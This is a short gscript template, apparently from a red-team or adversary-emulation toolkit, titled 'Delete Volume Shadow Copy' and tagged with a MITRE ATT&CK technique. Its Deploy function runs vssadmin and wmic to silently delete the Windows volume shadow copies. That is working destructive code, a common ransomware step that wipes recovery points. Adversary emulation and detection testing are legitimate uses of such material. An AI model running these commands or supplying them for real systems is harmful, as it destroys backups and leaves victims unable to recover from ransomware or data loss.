// Example gscript template
// Title: Delete Volume Shadow Copy
// Author: ahhh
// Purpose: Deletes the volume shadow copy with both wmic and vssadmin
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1107

//priority:100
//timeout:150

var fn;

function Deploy() {  
  console.log("starting execution of Delete Volume Shadow Copy");
  // Delete the volume shadow copy with the vssadmin tool
  G.exec.ExecuteCommandAsync("vssadmin.exe", ["delete", "shadows", "/for=c:", "/oldest", "/quiet"]);
  console.log("Deleted the volume shadow copy with the vssadmin tool");

  // Delete the volume shadow copy with wmic
  G.exec.ExecuteCommandAsync("wmic.exe", ["shadowcopy", "delete", "/nointeractive"]);
  console.log("Deleted the volume shadow copy with wmic");
  console.log("done Deleting VSC");
  return true;
}
